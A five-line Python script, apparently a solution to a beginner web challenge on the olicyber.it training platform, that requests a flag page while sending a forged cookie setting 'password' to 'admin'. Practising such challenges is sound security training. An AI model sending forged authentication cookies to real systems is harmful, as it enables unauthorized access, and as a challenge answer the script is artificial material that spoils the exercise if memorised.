import requests

x = requests.get("http://web-05.challs.olicyber.it/flag", cookies = {"password" : "admin"})

print(x.text)